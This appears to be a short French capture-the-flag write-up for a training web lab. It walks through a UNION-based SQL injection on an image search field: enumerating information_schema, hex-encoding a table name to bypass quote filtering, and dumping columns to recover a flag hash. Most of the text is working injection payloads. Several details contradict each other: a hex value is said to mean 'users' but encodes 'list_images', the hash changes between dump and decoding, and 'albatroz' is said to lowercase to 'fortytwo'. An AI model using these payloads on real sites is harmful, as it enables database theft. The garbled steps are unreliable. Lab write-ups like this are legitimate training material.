
On display les informations concernant la base de donnée SQL grace a information_schema.tables

Dans la barre de recherche de la page 'image':
1 union select table_schema,table_name from information_schema.tables

On voit qu'il existe une table list_images, il faut maintenant récupérer la value des columns pour trouver un couple identifiant/mot de passe. Pour contrer la sécurité sur les quotes qui nous empêche de demander directement la table users on convertit le nom de la table en hexa.

1 union select null,group_concat(column_name) from information_schema.columns where table_name = 0x6c6973745f696d61676573 # (0x6c6973745f696d61676573 == users en hexa seul moyen pour que table_name accept l'input)


Il nous reste plus qu'a choisir les columns que l'on souhaite


1 union select title,comment from list_images


result : 

ID: 1 union select title,comment from list_images 
Title: If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
Url : Hack me ?



md5 hash : 5928e8083cf461a51303633093573c46 =  albatroz
lower all char  = fortytwo
hash Sh256 = f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188
